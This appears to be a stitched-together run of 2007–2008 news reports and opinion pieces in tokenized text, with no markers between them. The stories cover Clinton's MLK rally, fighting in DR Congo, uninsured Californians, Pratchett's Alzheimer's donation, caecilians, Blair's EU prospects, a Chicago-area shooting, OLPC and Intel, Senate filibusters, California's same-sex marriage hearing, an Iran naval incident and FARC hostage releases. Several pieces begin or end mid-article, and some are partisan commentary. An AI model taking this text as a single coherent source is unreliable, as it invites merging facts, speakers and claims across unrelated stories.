Black security workers union greeted Clinton with a smattering of catcalls in the wake of her comments about Martin Luther King , Jr. Clinton booed at MLK rally in New York
NEW YORK , N.Y. —
Dogged by continuing racial tensions around her presidential campaign , Hillary Rodham Clinton drew a smattering of boos on Monday when she spoke at a religiously tinged Martin Luther King Jr. rally put together by a union organizing predominantly black security workers .
The catcalls came when Clinton was introduced and her speech drew only tepid applause compared to the boisterous ovations drawn by many of the pastors and reverends — not to mention a hip - hop artist and slam poet — who took the podium before her .

Her participation in the event drew nary a mention during nearly two hours of speeches , performances , prayers and acknowledgments .
But she was a late addition to the event — SEIU Local 32 BJ President Michael Fishman said he did n't know Clinton would be there until he arrived at the rally .
The SEIU affiliate supports Clinton , though a union official stressed that the event was not a Clinton campaign rally .
The New York senator called on the roughly 2,500 , mostly black attendees “ to fulfill [ King ’s ] unfinished dream and to live the legacy that we have inherited . ”
Some of her biggest applause came when she cited her rival for the Democratic nomination , Illinois Sen.
Barack Obama , who had his share of supporters at the event .
“ How many of us ever dreamed that we would see the day when a woman and an African - American are running for the presidency of the United States of America ? ” Clinton asked , referring to herself and Obama .
Even though the event was billed as a rally for an SEIU affiliate celebrating King ’s legacy and Clinton was a late - addition , the less - than - enthusiastic reception was still noteworthy .
It took place in Clinton ’s backyard and came as she is making extensive efforts to put the kibosh on the racially tinged controversy swirling around her campaign .
Black voters will be key in South Carolina ’s pivotal Jan. 26 Democratic primary , in which they are expected to cast about half the ballots .
On Sunday , in a “ Meet The Press ” interview taped during a visit to Columbia , S.C. , Clinton accused Obama of “ deliberately distorting ” her assertion that “ it took a president ” — Lyndon Johnson — to implement civil rights legislation King had advocated .
Clinton has repeatedly said her comments were taken out of context .
On Monday , she told the crowd : “ Both Sen . Obama and I know that we are where we are today because of leaders like Dr. King . ”
SEIU Local 32 BJ represents more than 85,000 cleaners , doormen , porters , maintenance workers and window cleaners in the mid-Atlantic region .
Attendance was encouraged by prominent New York pastors including the Rev. Johnny Ray Youngblood of St. Paul Community Baptist Church in Brooklyn , and the union , which gave members credit for attending that could be used to earn money for organizing activities .
The union endorsed Clinton last year , but Fishman did n’t mention her in an impassioned speech about the union ’s effort to organize security workers .
New York Democratic Reps. Gregory Meeks and Anthony Weiner , both of whom have also endorsed Clinton , touted the union ’s efforts in speeches that did n’t mention Clinton .
Weiner , in fact , cited Obama ’s campaign as emblematic of the progress toward racial equality since King ’s assassination .
“ Today we have an African - American standing to be president of the United States , ” he said to loud applause .
It ’s unclear if the boos stemmed from support for Obama , though random Politico.com interviews found as many Obama supporters and undecided voters as Clinton backers .
“ I ’m happy to have her , because I ’m a member of 32 BJ , but I ’m supporting Sen. Obama , ” said Elfatih Abusan , a 49 - year - old maintenance worker , who traveled from his home in Washington , D.C. , to the rally .
“ The people here did not open their hearts to her , ” he said of Clinton .
“ She ’s all right , ” said Eddie Davis , a 42 - year - old union member from Brooklyn .
He said he was still deciding between Clinton and Obama .
Gen Nkunda says he is protecting ethnic Tutsis
A Congolese general told the BBC that the bodies of 80 rebel fighters had been found but this has not been independently confirmed .
The clashes are continuing in two parts of North Kivu province , including in a park inhabited by mountain gorillas .
Some 170,000 people have fled the area this year , says the UN refugee agency .
The air strike by the Mi-24 gunship took place some 80 km ( 50 miles ) west of the regional capital , Goma , Colonel Delphin Kahimbi told the BBC .
" There was heavy fighting near Karuba .
We deployed an attack helicopter to back our ground troops , " he told the AFP news agency .
A Congolese general also said there was fighting near Sake , about 40 km ( 25 miles ) west of Goma , where fighting broke out last week .
The army says that 180 rebel fighters have now been killed in recent days .
Outrage
Conservationists are increasingly concerned for the remaining 700 mountain gorillas in the Virunga National Park .
Half of these live in Virunga , where the army is attacking the positions of renegade General Laurent Nkunda .
" If anything happens to the mountain gorillas now , there is nothing we can do , " said Norbert Mushenzi of the Congolese Institute for the Conservation of Nature ( ICCN ) .
" As of today , the sector is no longer under my control and we have been rendered powerless by these actions . "
Nine gorillas have been killed this year , allegedly by Gen Nkunda 's men , sparking outrage among conservationists .
Gen Nkunda 's forces are believed to have moved into the park in pursuit of Rwandan Hutu rebels , who have bases there .
Officials from local conservation group , Wildlife Direct , say the forces looted weapons and communication equipment from Jomba and Bikenge ranger patrol posts within the park .
A third post , Bukima , was evacuated for fear of imminent attack , the group said .
' State of war '
Gen Nkunda , a Tutsi , has accused the government of forming an alliance against him with the Hutu FDLR , accused of involvement in the 1994 Rwandan genocide of Tutsis .
After Tutsis took control in Rwanda , they crossed the border into eastern DR Congo .
Nine gorillas have already been killed this year
The United Nations says up to 10,000 people have fled the latest fighting into Uganda .
The UN refugee agency says it is organising shelter for those who fled the violence Monday night and wish to stay on the Ugandan side of the frontier .
Following a visit by Rwandan Foreign Minister Charles Murigande to Kinshasa , DR Congo has promised to increase its operations against the FDLR .
Rwanda has twice invaded its large neighbour , saying it is trying to stop the FDLR from attacking its territory .
Peacekeepers
BBC Kinshasa correspondent Arnaud Zajtman says that the two countries are still divided by the same issues which have divided them for years - DR Congo wants Rwanda to rein in Tutsi fighters , such as Gen Nkunda , while Rwanda wants DR Congo to stop the activities of the Hutu rebels , known as the FDLR .
Last month , Rwanda protested against DR Congo 's move to call off an offensive against the FDLR .
Mr Murigande and his Congolese counterpart Mbusa Nyamwisi also asked the UN to intensify patrols in the east of the country where fighting is raging .
The UN has some 17,000 peacekeepers in DR Congo - the largest such force in the world and has sent an extra 200 troops to the region after the latest fighting .
Our reporter says the ministers have also agreed to form a commission to ensure that Congolese ethnic Tutsis who are refugees in Rwanda are repatriated .
The other day , I admitted to a friend that I do n’t have health insurance .
“ What ? ! ” he gasped .
“ But you ’re married .
Is n’t that part of the deal ? ”
He reacted as if I had just told him that I believed in Santa Claus or the Easter Bunny or a flat tax -- something embarrassingly ridiculous .
Because that ’s what being uninsured is these days -- a character flaw .
It ’s how you can pay taxes , volunteer , donate to public radio and still be considered a drain on society .
As my friend was , you may be wondering , “ Seriously , how can you not have health insurance ?
Do n’t you work ?
Are you illiterate ?
Do you have no self - worth whatsoever ? ! ”
The short answer is , my husband and I are both freelancers so we have no workplace insurance .
And the $ 500 - plus monthly premium ?
You might as well say our health depended on our adding a new wing to our apartment .
The uninsured are a puzzling group for California lawmakers .
Telling the uninsured not to be uninsured , for example , is the solution they came up with .
And taxing smokers ( banking on their inability to quit but sufficient longevity to make it profitable ) to pay for the poor is how lawmakers proposed to fund it .
They called it ABX1 1 .

This was n’t good legislation .
Good legislation has supporters ; ABX1 1 had apologists .
And it came to an ignoble end last week , killed by an 11 - 1 vote in a state Senate committee .
Even though I ’m not for radical change , I do favor radical improvement .
ABX1 1 was neither .
It came around on its face :
It appeared that the cure was the same as the disease .
Personally , I make above $ 47,000 a year , the cutoff for subsidized policies under the plan .
I also live in a city where median home prices are still about half a million dollars .
Now , while Countrywide Financial Corp. may have happily approved me for a loan a couple of months ago , that does n’t mean I have any money .
So the mandate to buy insurance would have fallen on a lot of broke ears , not just mine .
Healthcare costs in this country , according to the World Health Organization , are the highest in the Western world .
And the chasm between medical care for those with money and those without is potentially deadly .
I once had a plantar wart that was near - fatal .
True story .
Some people gamble at casinos for kicks ; I eat uncooked fish .
There is n’t a moment that I do n’t know that I am one accident or diagnosis away from complete financial ruin .
Where are the riots ?
Where ’s the outrage ?
Did n’t Michael Moore do a documentary on this ?

The uninsured and the underinsured need true political advocates .
There ’s only one way I see that happening .
We should force all our elected officials in California to live uninsured for at least 2 1/2 months of the year .
Believe me , healthcare will get reformed quicker if their lives and livelihoods depend on it .
One in five Californians are uninsured -- so all our elected officials should be uninsured for one - fifth of the year until they fix the problem .
What good would that do ?
In 1993 , San Francisco passed a nonbinding measure encouraging public employees from the mayor on down to take public transit at least twice a week .
How ’s that city ’s transit system now ?
Among the best in the country .
People take vows of poverty to learn humility .
People fast to learn gratitude for abundance .
People live off the grid to teach themselves -- I do n’t know -- candle - making skills .
Living uninsured can teach our elected officials to care for the healthcare system .
( Lesson one -- negotiate drug prices .
There are more Californians than Canadians .
Hint. Hint . )
Call it a fact - finding mission .
Make it sound heroic .
It ’s no more absurd than what they came up with .
Another reason to love science fiction fandom ... Terry Pratchett , the world 's funniest fantasist , has donated half a million pounds sterling ( well over a million dollars ) for research into the causes and cures of Alzheimer 's Disease .
Which might prompt most people to say , " Hey , good for Terry . "
But it 's prompted a lot of SF fans and writers to say , " Hey , that 's a pretty good start , " and launch their own effort to match Terry 's incredibly generous donation .
The effort was launched by Pat Cadigan ( a terrific writer herself , queen of cyberpunk and once one of the Wild Cards gang ) , and has been snowballing rapidly with lots of other fans and writers joining in .
" It looks like the blogosphere is making the fight against Alzheimer 's a whole lot stronger , " a spokesman for the Alzheimer 's Research Trust wrote to Pat , as she reported on her own Live Journal .
At the Alzheimer 's Research Trust , we 've been overwhelmed by the support from around the world since Terry 's donation and speech on Thursday .
It 's completely unprecedented for us : we 're truly grateful .
" There 's all sorts of ways that you too can help , and I hope you will .
You can just go to http://www.alzheimers-research.org.uk/ and donate however much you can spare .
Tell them it's for Terry Pratchett , so it will count as part of the Match It For Pratchett campaign .
Or you can go to http://poosk.com/2008/03/14/match-it-for-pratchett/ and buy the Match It For Pratchett t- shirt .
All profits will go to Alzheimer 's research .
Or you can head on over to ebay at http://search.ebay.com/_W0QQsassZbenveniste and bid on one of the books I 've donated to the campaign .
Let 's see , there 's a copy of the deluxe leather - bound GAME OF THRONES rpg from Guardians of Order ( out of print ) , a signed hardcover of my young adult book THE ICE DRAGON ( illustrated by the wonderful Yvonne Gilbert ) , a presentation copy of the signed limited illustrated edition of FEVRE DREAM from Subterranean Press ( sold out ) , a hardcover copy of SHADOW TWIN , the novella on which HUNTER'S RUN was based ( signed by me , Gardner Dozois , and Daniel Abraham ) , a hardcover of the new Wild Cards book INSIDE STRAIGHT ( signed by seven of the nine contributors ) , and all sorts of other great stuff ... including a set of bound galleys of GOOD OMENS , by Terry Pratchett and Neil Gaiman .
All monies raised will go to Alzheimer 's research , and there are some great collectibles on offer , so please , head on over to ebay and bid , bid , BID .
There 's also an official Match It For Pratchett website where you can check out the latest news about the campaign -- and there should be plenty of news in the weeks and months to come , with more auctions , merchandise , contests , and other fund - raising efforts being planned .

This is a great cause headed up by some great people .
They 've already raised a lot of money , but there 's still a long way to go to match Terry 's donation .

The team recorded footage of a female worm - like amphibian , called a caecilian , allowing her young to peel off and eat her skin .
Scientists have only recently discovered this bizarre parental behaviour .
The female caecilian 's skin becomes thicker and more nutrient - rich when she bears offspring .
And the young have specialised teeth for tearing and removing it .
The footage was recorded for the BBC One series Life In Cold Blood .
The crew was able to catch this behaviour on camera by building a set which resembled the shallow , humid underground chambers that the creatures live in .
It took several attempts to capture the footage ; the caecilian babies would only eat their mother 's skin for about 10 minutes , once every three days , and often at night .

In Cold Blood is on BBC One on Monday , 11 February at 2100 GMT and is repeated on BBC One on Sunday , 17 February at 1800 GMT .

As today 's primary could be the final stand in the Democratic presidential contest , metrics regarding candidates ' popularity are pouring in .
Among them , the nation 's leader in online book rental , BookSwim.com ( often dubbed " Netflix for books " ) , reports that books written by Sen.
Obama are out - renting Sen. Clinton 's by a staggering 25:1 .
The rental demand for Sen. Obama 's 2006 release , " The Audacity of Hope " , combined with his earlier , " Dreams from my Father " ( 1995 ) , make Obama Book Swim 's top-renting non-fiction author - even beating out best - selling " Eat , Pray , Love " author , Elizabeth Gilbert .
Sen .
Obama 's high book - rental volume could mean many different things for the presidential hopeful .
Voters may be scrambling to read his works because he is seen as an " unknown entity " to much of America , whereas Sen.
Clinton 's public ( and private ) life is undeniably well - recognized by the American people .
Because Sen. Clinton 's latest book was published three years prior to Obama 's " The Audacity of Hope " , Book Swim 's research additionally combines Sen.
Clinton 's two titles , " It Takes a Village " ( 1996 ) and " Living History " ( 2003 ) , with those of husband , former President Bill Clinton , entitled " My Life " ( 2002 ) and his recent bestseller , " Giving " ( 2007 ) .
Though a marked shift , Barack Obama 's books still lead by a ratio of 11 to 1 .
Even when all Clinton titles are combined with Carl Bernstein 's recent pro-Clinton , " A Woman in Charge " , Obama retains the book lead with a 5 to 1 rental ratio .
Though dramatic in contrast , BookSwim 's study of Americans ' reading preference reflects the recent turnaround in the candidates ' polls .
Candidates often hope that book revenue may increase campaign funding , and though BookSwim.com reports purchasing several more copies of Obama 's works in recent months , keeping up with demand from online book rental subscribers , neither Sen. Obama nor Sen.
Clinton reap profits from repeat rental of their books beyond the initial purchase .

Blair , who is being actively promoted by the French president Nicolas Sarkozy , recognises he would need to abandon his well - paid , private sector jobs if he won .
His wife Cherie - often portrayed as seeking ever more wealth and well - paid consultancies for her husband - is understood to be supportive of him accepting the job .
Some Blair allies also say that he now recognises that as envoy in the Middle East he is not going to be allowed to become the key player in furthering Israeli - Palestinian talks this year , and will be reduced to a role of supporting political development in Palestine and boosting its economy .
The president of the European council of ministers is a post created under the Lisbon treaty .
The president will be the permanent chair of the council of ministers , Europe 's chief decision - making body .
Jonathan Powell , Blair 's Downing Street chief of staff , is among the former lieutenants he has met to discuss a bid for the European role .
Some senior figures believe he could yet be a loser in the carve - up of four big European jobs due to be distributed at the end of the French presidency in the second half of this year .
Some claim that if the commission president , José Manuel Barroso , wanted to remain in post for a second term , it would be difficult for Blair , a political ally and previous advocate for Barroso , to hold the parallel , prestigious European council job .
Decisions also have to be made on the appointment of a new , " high representative " on foreign policy , and the post of president of the European parliament .
Smaller EU countries are sensitive about key jobs being taken by leading figures from larger countries , especially from one that is not part of the eurozone or the Schengen free - movement area , and that actively supports Turkish membership , as Britain has .
Some French socialists have already come out against Blair , citing his role in the war in Iraq .
Former French president Valéry Giscard D'Estaing has also expressed his opposition .
It is thought that the German chancellor , Angela Merkel , is not persuaded of the advantages of a Blair presidency .
The Christian Democrats have recently been politically weakened in state elections , and fear a Blair presidency might strengthen the German Social Democrats .
Neither the Germans nor the French would push Blair if they believed his appointment was going to be opposed by Gordon Brown .
Blair himself is still doubtful that the role of council president will become a powerful job , saying he senses that even pro-Europeans might recoil from ceding power from the nation state .
With most countries currently focused on ratifying the Lisbon treaty through their national parliaments , decisions on the powers of the full - time president are unlikely to be made until the second half of the year .
Apart from Blair , two other candidates most often mentioned are the former Austrian chancellor Wolfgang Schüssel , promoted by Germany , and the current Luxembourg prime minister , Jean - Claude Juncker .
TINLEY PARK , Ill . ( AP ) --
Authorities launched a manhunt Saturday after discovering " multiple " victims in a clothing store in a suburban Chicago strip mall .
They did not immediately confirm a report that four people had been killed .
Police Sgt. T.J. Grady said officers responding to a 911 call about a shooting at about 10:45 a.m. found " multiple victims " inside the Lane Bryant store .
Grady refused to release other details or take questions , but said " the offender " had apparently left the area in the suburbs southwest of downtown Chicago .
Will County Coroner Patrick O'Neil told the Chicago Tribune that police have reported four deaths .
Authorities at the scene declined to give details on the incident , but cordoned off the strip mall area , waving would - be shoppers by as they approached entrances Saturday afternoon .
Tracy Caccavella was shopping at a Pet Smart store late Saturday morning across the parking lot from the Lane Bryant when she saw police enter the pet supply store .
" Six police entered the store with their hands on their gun holsters , " Caccavella said .
Police conducted a thorough search and left , she said .

Fresh from the Wall Street Journal , One Laptop Per Child and Intel have just hit divorce court :
Intel says it no longer will support One Laptop Per Child , and has resigned from the board over the nonprofit 's demand that it stop selling its Classmate laptop and other laptops in the developing world .
Intel says it has canceled plans for an Intel - based OLPC laptop .
Now am I the only one who saw that coming since July ?
Did OLPC really think it was going to stop Intel for selling Classmate PC's when it 's AMD - powered device was making inroads into the developing world ?
And to think Intel would do so for anyone , for or non-profit , goes against every stock option it ever granted .
And did OLPC think it was going to convince Intel to stop " other laptops " ( the Asus Eee PC ? ) from appearing ?
That goes against the hyper - competitive nature of the entire Silicon Valley , and even OLPC 's original mission statement .
Sadly , this spat has ended hopes for a Diamondville XO Laptop , which could have born the best of both worlds :
Intel focused on selling laptops , OLPC focused on changing education .
But at least now the Intel conspiracy theories will come roaring back to life in the comments section , right .

Congratulations to the record - breaking Senate GOP — Most .
Obstructionist .
Ever .
For quite a while , many of us have wondered whether Republican officials in Washington have any apparent talents at all .
Governing is clearly not their strong suit , but are they completely without skills ?
Absolutely not .
The 49 - member Senate Republican minority has done something no Senate minority in American history has ever done : they ’ve filibustered more bills than any Congress ever has — and they broke the record with a full year to spare .
The latest came this morning , when the Senate GOP filibustered an omnibus budget bill , the 62nd Republican filibuster since the 110th Congress began in January .
“ In just one session , a minority in Congress has prevented a mind - blowing 62 pieces of legislation from going to the floor for an up or down vote , ” said Campaign for America ’s Future co-director Roger Hickey .
“ Our report shows how over and over again , the uncompromising minority has thwarted the will of majorities in Congress and of the American people , holding the Senate floor hostage to a radical right - wing agenda . ” [ … ]
Eric Lotke , Campaign for America ’s Future research director and lead author of the new report , calls the obstruction a “ deliberate strategy . ”
He observes that the congressional Republicans block legislation , then blame the Democrats for getting nothing done .
“ It ’s like mugging the postman and then complaining that the mail is n’t delivered on time . ”
Brian Young , noting the historic quality of the achievement , added , “ Only a group with a near - pathological disregard for the actual health of our democracy , only a group with a single - minded focus on the cynical political strategies of their consultants , only a group with an imperious disdain for the people of the country could ’ve pulled off such a feat . ”
Quite right .
This was a record that was n’t meant to be broken .
The “ Roadblock Republican ” label is not meant as a compliment .
Back in April , Trent Lott conceded publicly , “ The strategy of being obstructionist can work or fail … and so far it ’s working for us . ”
Bill
Scher reminds us that it may be working for the GOP , but it ’s failing for everyone else .
What have conservatives obstructed this year ?
Here ’s just a partial list : — Ending the disastrous occupation of Iraq .
— Providing health insurance to millions more kids .
— Empowering Medicare to negotiate for lower prescription drug prices .
— Taking away handouts to Big Oil so we can invest in renewable energy .
— Repealing the effective ban on embryonic stem cell research .
— Investing more in health research .
— Making it easier for workers to join unions .
— Investing more in fighting poverty and training workers .
Is obstructing all of that popular legislation “ working ” for Republicans ?
If Congress ’ approval rating is any indication , the answer is no .
But it ’s the speed with which the Republicans broke the record that really amazes me .
The previous record took two years to accomplish ; these guys broke the record in half the time .
That ’s like breaking the single - season home - run record before the All - Star break .
And by the way , just for good measure , let ’s answer the trivia question .
When was the previous record set ?
That would be the 107th Congress — the last time Republicans were in the minority .
It took a while , but we ’ve finally found what the minority party is good at .
Congratulations , Republicans , for undermining the legislative process , the will of the people , and a much - needed policy agenda to a literally historic degree .
Four years after thousands of same - sex couples streamed into this liberal bastion to apply for marriage licenses , the California Supreme Court on Tuesday took up the question of whether gay people have a constitutional right to wed .
During more than three hours of arguments from lawyers for and against same - sex marriages , several justices appeared to be skeptical of legalizing the unions , suggesting they see the state ’s domestic partnerships as marriage in all but the name .
Justice Carol A. Corrigan observed that it might be best to leave the question “ to the democratic process ” because the perception of same - sex marriages is evolving .
She also asked lawyers to show her where the state Constitution addressed same - sex marriages .
“ Is it better for this court to decide or the people of California to decide ? ” Corrigan asked .

Three of the court ’s seven justices strongly indicated that they would uphold the state law defining marriage as a contract between a man and a woman , one suggested that gays should prevail and the other three asked questions critical of both sides .
The court ’s extraordinary hearing regarding In re Marriage Cases , S14799 , is the culmination of a long legal fight that began when San Francisco issued marriage licenses to nearly 4,000 same - sex couples in February and March 2004 .
San Francisco ’s extraordinary move came at a time of intensifying national debate over same - sex marriages after Massachusetts , as result of a historic 2003 court decision , became the only state to legalize same - sex unions .
The court is deciding four lawsuits brought on behalf of nearly two dozen same - sex couples .
A trial judge here ruled in favor of same - sex marriages , but a Court of Appeal rejected that decision on a 2 - 1 vote .
Atty . Gen. Jerry Brown and Gov. Arnold Schwarzenegger argued in favor of keeping marriage an opposite - sex union , and Christian - affiliated groups joined them .
The California high court invalidated the San Francisco marriage licenses in August 2004 , but will decide within 90 days whether gay men and lesbians should be permitted to marry in the future .

The hearing attracted an overflow crowd in the courtroom and protesters outside who carried signs , including one that read “ Sodomy Is Sin . ”
Hundreds watched the televised hearing from various venues across San Francisco and at City Hall in West Hollywood , with many cheering the lawyers for same - sex couples and booing justices who asked critical questions .
Justice Marvin R. Baxter reminded lawyers that the initiative limiting marriage to unions between a man and a woman was ratified by the voters , and that the state Legislature has given same - sex couples “ virtually equal rights except the title ” of marriage .
San Francisco Chief Deputy City Atty .
Therese M. Stewart told the court that “ the name ‘ marriage ’ matters . ”
But Justice Ming W. Chin chided : “ Does n’t that place rhetoric over reality ? ”
Chief Justice Ronald M. George and Justice Carlos R. Moreno suggested that the state might have a rational basis for limiting marriage to opposite - sex couples because the federal government does not recognize same - sex marriages .
Advertisement
“ Does n’t this just boil down to the use of the ‘ M - word ’ -- marriage ? ” Moreno asked .
“ That symbol , ” Stewart replied , “ has deep meaning . ”
George seemed skeptical of the argument that a ban on same - sex marriages amounted to sex discrimination because the ban “ seems to treat males and females equally . ”
But he also peppered the opponents of same - sex marriages with skeptical questions and stressed that the court had the authority to overturn long - established laws and voter initiatives .
Justice Kathryn Mickle Werdegar , one of the more liberal members of the court , asked Stewart if the concept of equal protection under the law evolves .
Stewart replied that it did .
Advertisement
“ Why is this the moment of truth as opposed to 10 years from now ? ” Werdegar asked .
“ We ’re here today , ” Stewart told her .
Lawyers in favor of same - sex marriages said a 1948 California Supreme Court ruling that struck down a ban on interracial marriages set a precedent for upholding a fundamental right to marry the person of one ’s choice .
But Baxter appeared incredulous , asking whether anyone really believed that the court back then envisioned same - sex marriages .
“ When did same - sex couples acquire the constitutional right to marry ? ” Baxter asked .
When a lawyer for same - sex couples replied that they have long had that right but the state has ignored it , Baxter again appeared skeptical .
“ So from the day the Constitution was adopted " more than 150 years ago ?

Kennard , however , and some of the other justices also expressed uncertainty that a ban on same - sex marriages should be upheld as a matter of tradition .
“ Just because there has been a tradition of something or other does n’t mean that that tradition is legally right or constitutionally protected , ” Kennard observed .
Waukeen McCoy , one of the lawyers arguing in favor of gay rights , said the court appeared to have the view that the plaintiffs were trying to redefine marriage .
Kennard grinned .
“ You do n’t know what we ’re going ” to decide , she said .
Advertisement
Kennard noted that the state ’s domestic partner law makes it easier for couples to end their relationships “ whereas it ’s much harder to get out of marriage . ”
Deputy Atty . Gen. Christopher E. Krueger retorted that some would consider that an advantage .
Glen Lavy , senior counsel of the Alliance Defense Fund , which opposes same - sex unions , told the court that the state ’s laws do not prohibit gays from marrying , just from marrying someone of their own gender .
“ They are allowed to marry but not allowed to form a same - sex couple and call it marriage , ” Lavy said .
While the court listened to arguments , both sides in the dispute faced off with banners and sometimes angry exchanges outside .
Ronald Brock of San Diego drove through San Francisco ’s streets in a red truck bearing an American flag and a mix of religious and political messages , including an image of the burning twin towers in New York City and one of two men embracing , encased in the international circle and slash symbol -- near the words “ Truth not Tolerance . ”

The 69 - year - old man said he knew that his message was not well - received .
“ Most people give me the middle finger , ” Brock said .
“ But I ’m here bearing the truth to people who are n’t used to hearing the truth . ”
At City Hall in West Hollywood , where a large banner advertised “ Gay Ballroom Classes , ” a group of about 30 residents and city employees watched the arguments intently on two television screens .
Even city affairs seemed to have taken a back seat -- Mayor John Duran sat closest to the television for several hours Tuesday morning .
“ They ’re talking about us , ” said Duran , who has been in a domestic partnership for nine years .
“ I sort of feel like a lab rat ; they ’re talking about my life . ”

Duran said he decided last week to hold the public viewing because of the attention surrounding the arguments in his city .
He estimated that about a third of the city ’s residents are gays or lesbians .
“ I think early on a lot of us had a sense of dread as justices were scrutinizing our side , ” he said .
“ Now that they ’re grilling the other side , there ’s more levity . ”
The morning was a particularly emotional one for Tim Thomson , 44 , who married his partner of 25 years in Oregon only to see his license nullified by the state Supreme Court there in 2005 .

“ It ’s frustrating that we ’re here , ” said Thomson , a claims specialist for the city who has lived there for 27 years .
“ It ’s a no - brainer for me .
I ’ve been with my honey for 25 years , and I should have a right to marry . ”

As the American people amuse themselves with the illusion that they have any say in the way they are presently governed , our rulers are moving toward war .
Two recent incidents underscore the imminence of this prospect .
The Iranian " provocation " in the straits of Hormuz has set the stage for a new " crisis " manufactured wholly by the War Party , the rationale for which is uncritically accepted by our passive " mainstream " media .
We are expected to believe that five minuscule speedboats " menaced " the USS Hopper , a destroyer armed with missiles ; the cruiser USS Port Royal ; and the USS Ingraham , a frigate .
That ’s rather like five gnats " menacing " a trio of elephants .
Oh , but that ’s not all .
In addition to intercepting the American flotilla , CNN reports the Iranians supposedly issued explicit threats :
" In one radio transmission , the Iranians told the U.S. Navy : ‘ I am coming at you .
You will explode in a couple of minutes , ’ the U.S. military officials told CNN . "
The Iranians , for their part , say nothing untoward occurred that does n’t happen all the time in the Gulf : they simply asked the ships to identify themselves , and it was all very routine .
I challenge anyone to look at the following video and tell me honestly they hear or see anything that looks like an Iranian " provocation . "
It ’s all very murky and dubious :
In any event , this is a provocation , all right  on the part of the Bush administration .
As our president travels to Israel , the fulcrum of our policy of Mideast expansionism , there can be little doubt that this is all part of a carefully stage - managed effort to portray Iran as an aggressor  a scenario made doubly ironic when one considers that the U.S. has sent two aircraft carriers into the Gulf and has massed 150,000 troops in neighboring Iraq , where Washington accuses the Iranians of " interference . "
We , of course , are allowed to invade countries with impunity : but Iran , which shares a long border with Iraq , and has close political and economic ties with the Iraqis , has no right to secure its own interests in the region .
Israel has the right to defend itself : that ’s the mantra we hear without respite whenever the Israelis take it into their heads to launch yet another " incursion " into the Gaza strip or invade Lebanon  but the Iranians have no such reciprocal right , even a few miles from their own shore .
Funny how that works .
What I would like to know is this : what if Iranian ships were in the Gulf of Mexico , on some pretext or other  say , keeping the sea lanes open for the transport of material deemed necessary to Iran ’s " national security "  how would we feel about it ?
What , we would want to know , are Iranian ships doing a few miles from American shores ?
As I warned during the British sailors ’ contretemps , the presence of Western warships in the Gulf makes the likelihood of a confrontation with the Iranians almost inevitable .
The maritime boundaries , between Iran and Oman , for instance , are hazy : it is not inconceivable that the American ships went off course , for one reason or another , and the Iranians responded  or vice - versa .
In any case , this ongoing game of cat - and - mouse is tailor - made for setting the stage for an all - out war .
The commander of one of the U.S. warships has been quoted as saying that they were " a heartbeat away " from opening fire on their Iranian tormentors , and that just about sums up the chances of an armed conflict breaking out  we ’re an incident away from going to war with Tehran , and there is every indication that the administration is marshaling its forces , political and diplomatic as well as military , to launch an assault before Bush leaves office .
This latest incident also underscores the significance of the recently - passed Kyl - Lieberman resolution , which Hillary Clinton voted for , that designates the Iranian Revolutionary Guards a terrorist organization .
The Iranian navy has withdrawn from the Gulf , and it is the Guards who constitute Iran ’s first line of defense .
American warships and troops in the area are therefore empowered and even encouraged to engage in " hot pursuit " of these alleged " terrorists "  and embroil us in a conflict that will make the Iraq war seem like the " cakewalk " it was supposed to be .
More evidence of America ’s aggressive intentions comes in the form of news reports of U.S. plans to intervene more directly in Pakistan : Bush is considering " expanded covert operations " using Special Forces , perhaps in a bid to capture Osama bin Laden and / or neutralize al - Qaeda units alleged to be hiding in the tribal areas .
Yet we do n’t know that bin Laden is in Pakistan , and the prospect of Americans being killed or captured in the course of such operations should certainly cause Washington to hesitate before acting .
It is n’t hard to imagine a huge backlash generated by such actions , including the complete destabilization of a country already on the brink .
It ’s interesting that none of the " major " presidential candidates has spoken out on this issue : here we are , on the brink of war , and where are the " antiwar " Democrats ?
Barack Obama is being touted as some sort of savior who can " bring us together " in a Rapture - like mega love - in of " national unity " and " hope . "
Yet Obama has said attacking Iran is " on the table , " a view he shares with Hillary , Edwards , and all the rest of the Democrats except for Dennis Kucinich and Mike Gravel .
As Bush travels to the Middle East to gather support for his campaign to isolate Tehran and declares that “ Iran was a threat , Iran is a threat , and Iran will continue to be a threat "  in spite of his own National Intelligence Estimate , which says quite the contrary  the Democratic presidential aspirants are strangely silent .
Of all the candidates , in both parties , only Rep. Ron Paul , a 10 - term Republican congressman from Texas , has warned about the dangers of another Gulf of Tonkin - style incident .
While celebrity politics overwhelms the sleeping electorate and Obama Girl flounces around on YouTube , Americans are under the illusion that they control events , but it is n’t so .
The invasion and occupation of Iraq has unleashed forces that cannot be contained and are even now gathering for an explosive finale .
George W. Bush still has the power to change the political landscape with a single command , and it seems fairly certain  to me , at least  that he intends to do so .
Perhaps he can be prevented from taking this fatal course by military commanders and rational elements in the national security bureaucracy ; perhaps not .
In any case , recent events  and especially this ominous Middle East trip , which you can bet has little to do with a " peace plan "  ought to make us all very nervous .

CARACAS , Venezuela ( AP ) 
Four hostages were freed by Colombian rebels Wednesday after six years of captivity and flown to Venezuela , where they appealed to President Hugo Chavez to help press for the freedom of all remaining hostages .
The ex-lawmakers were released Wednesday in a gesture coordinated with Chavez as the leftist rebels seek to put pressure on Colombia 's U.S. - allied government and persuade the international community to strike them from lists of terrorist groups .
" You 've given me the opportunity to live again , " hostage Gloria Polanco said as she was freed in a Colombian jungle clearing , thanking Chavez for allowing her to see her three grown sons again .
The four were reunited with relatives amid tears , hugs and grasped flowers at Caracas ' international airport .
Then Chavez welcomed them to the presidential palace , where Polanco made a passionate plea for the Venezuelan leader to help win the release of ailing former presidential candidate Ingrid Betancourt , a dual French - Colombian citizen who is one of the most prominent captives .
" As a woman and a mother , I ask from my heart here in front of everyone that you fight to get Ingrid free as soon as possible , " Polanco implored .
" She is very ill , president , very ill .
She has recurrent hepatitis B and is near the end . "
Chavez turned to TV cameras recording the meeting and asked the rebel leader Manuel Marulanda , " from my heart to change Ingrid 's location .
Move her to a base closer to you , while we continue working to pave the way for her definitive release . "
Chavez called Betancourt 's case " urgent . "
He also pledged " to continue doing all we can to liberate the very last " of the hostages held by the Revolutionary Armed Forces of Colombia , or FARC .
The FARC has proposed trading some 40 high - value captives — including Betancourt and three U.S. defense contractors — for hundreds of imprisoned guerrillas .
In France , Foreign Minister Bernard Kouchner said the liberation provides " powerful encouragement " toward finding a " humanitarian solution to the hostage drama . "
But the Colombian government and the rebels remain far apart on the conditions for talks .
Chavez 's intercession in Colombia 's long - running conflict — and the hostage releases it has reaped — has raised the profile of the FARC , as it seeks to persuade the European Union to remove it from its list of international terrorist groups .
